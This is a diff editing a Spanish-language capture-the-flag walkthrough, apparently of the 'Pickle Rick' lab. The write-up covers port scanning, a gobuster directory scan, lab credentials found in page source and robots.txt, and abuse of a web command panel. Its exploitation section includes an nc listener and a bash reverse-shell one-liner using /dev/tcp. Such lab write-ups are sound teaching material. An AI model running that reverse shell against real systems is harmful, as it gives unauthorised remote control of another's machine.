@@ -10,19 +10,17 @@
 
 #:El escaneo nos permite identificar los siguientes puertos abiertos:
 
-Puerto	Servicio	Descripción
-22	      SSH	    Secure Shell
-80	      HTTP	  HyperText Transfer Protocol
+Puerto: 22, 80
+Servicios : http y ssh
+Descripción: ssh (secure shell), http(hypertext transfer protocol)
 
 #:Al encontrar el puerto 80/tcp abierto, podemos acceder al servidor web desde el navegador utilizando:
 
-http://<IP>
+http://IP/
 
 #: Al revisar la página web, encontramos una imagen y decidimos inspeccionar el código fuente.
 
-#: Dentro del código fuente encontramos un comentario que revela el siguiente usuario:
-  
-  Username: R1ckRul3s
+#: Dentro del código fuente encontramos un comentario que revela el siguiente usuario: R1ckRul3s
 
 ## 2. Escaneo y enumeración
 
@@ -30,7 +28,7 @@ http://<IP>
 
 #: Utilizamos Gobuster para descubrir directorios y archivos:
 
-  gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,js,py
+  gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,js,py
 
 Parámetros utilizados
 -u: especifica la URL objetivo.
@@ -44,7 +42,7 @@ Parámetros utilizados
 3 robots.txt
 
 #: Accedemos a:
-  http://<IP>/login.php
+  http://IP/login.php
 
 #: Encontramos un formulario de autenticación que solicita:
 
@@ -53,12 +51,9 @@ Password:
 
 #: Ya conocemos el usuario: R1ckRul3s
 
-#: También accedemos a:
-  http://<IP>/robots.txt
+#: También accedemos a: http://IP/robots.txt
 
-#: Encontramos la siguiente información:
-
-  Wubbalubbadubdub
+#: Encontramos la siguiente información: Wubbalubbadubdub
 
 #: Probamos este valor como contraseña junto con el usuario encontrado anteriormente.
 
@@ -66,8 +61,7 @@ Password:
 
 ## 3. Análisis de vulnerabilidades
 
-#: Después de autenticarnos, la URL cambia a:
-  http://<IP>/portal.php
+#: Después de autenticarnos, la URL cambia a: http://IP/portal.php
 
 #: En esta página encontramos un Command Panel que permite introducir comandos.
 
@@ -78,8 +72,8 @@ Password:
 #: También podemos utilizar ls para listar el contenido donde nos encontramos
 
 #: Durante esta enumeración encontramos:
-  Sup3rS3cretPickl3Ingred.txt
-  clue.txt
+  1 Sup3rS3cretPickl3Ingred.txt
+  2 clue.txt
 
 ## 4. Explotación: 
 
@@ -163,9 +157,9 @@ Password:
 #: En nuestra máquina de ataque iniciamos un listener: nc -lvnp 4444
 
 #: Desde el Command Panel podemos ejecutar una reverse shell:
-  -comando: bash -c 'exec bash -i &>/dev/tcp/<IP>/4444 <&1'
+  -comando: bash -c 'exec bash -i &>/dev/tcp/ip/4444 <&1'
 
-#:Debemos reemplazar <IP> por la dirección IP de nuestra máquina de ataque.
+#:Debemos reemplazar IP por la dirección IP de nuestra máquina de ataque.
 
 #: Una vez recibida la conexión, comprobamos el usuario actual:whoami
 
